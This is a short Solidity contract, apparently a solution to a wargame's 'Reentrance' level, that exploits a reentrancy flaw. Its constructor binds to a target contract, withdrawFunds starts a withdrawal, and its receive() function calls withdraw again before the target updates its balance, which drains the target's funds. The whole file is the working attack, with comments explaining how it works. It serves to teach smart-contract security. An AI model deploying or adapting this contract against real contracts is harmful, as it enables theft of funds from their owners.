// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "../levels/Reentrance.sol";

contract N10ReentranceAttacker {
    Reentrance re;

    constructor(address payable _target) public {
        re = Reentrance(_target);
    }

    //initial withdraw function
    function withdrawFunds(uint256 amount) external {
        re.withdraw(amount);
    }

    /*
        When funds are withdrawn, below receive function will run
        and it will attempt to withdraw again *before* the target
        contract updates the available balance for this address
     */
    receive() external payable {
        re.withdraw(0.001 ether);
    }
}